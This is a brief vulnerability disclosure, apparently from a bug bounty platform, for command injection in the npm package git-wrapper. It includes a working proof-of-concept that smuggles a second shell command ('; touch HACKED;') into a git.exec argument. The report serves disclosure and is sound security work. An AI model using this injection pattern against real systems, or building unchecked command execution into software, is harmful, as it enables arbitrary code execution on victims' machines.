The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: 

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var Git = require('git-wrapper');
var git = new Git();
git.exec('ssss; touch HACKED;', [], function(err, s){})
```
2. Check there aren't files called `HACKED`
3. Execute the following commands in another terminal:
```bash
npm i git-wrapper # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/pvorb/node-git-wrapper/issues/5)
 - [GitHub Permalink #1](https://github.com/pvorb/node-git-wrapper/blob/master/git.js#L33)